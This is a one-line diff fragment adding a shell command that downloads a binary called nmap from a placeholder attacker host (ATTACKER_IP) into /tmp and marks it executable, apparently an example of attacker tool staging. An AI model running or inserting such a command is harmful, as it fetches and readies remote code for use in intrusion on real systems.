@@ -1,0 +1,1 @@
+curl -o /tmp/nmap http://ATTACKER_IP/tools/nmap && chmod +x /tmp/nmap
